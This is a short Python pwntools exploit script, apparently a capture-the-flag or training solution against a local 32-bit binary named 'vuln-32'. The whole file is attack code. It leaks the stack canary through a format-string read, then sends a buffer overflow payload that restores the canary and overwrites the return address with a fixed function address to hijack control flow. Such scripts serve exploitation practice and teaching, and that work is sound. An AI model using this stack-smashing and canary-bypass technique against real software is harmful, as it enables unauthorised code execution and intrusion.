from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)  # overwrite canary with original value to not trigger
payload += b'A' * 12    # pad to return pointer
payload += p32(0x08049245)

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))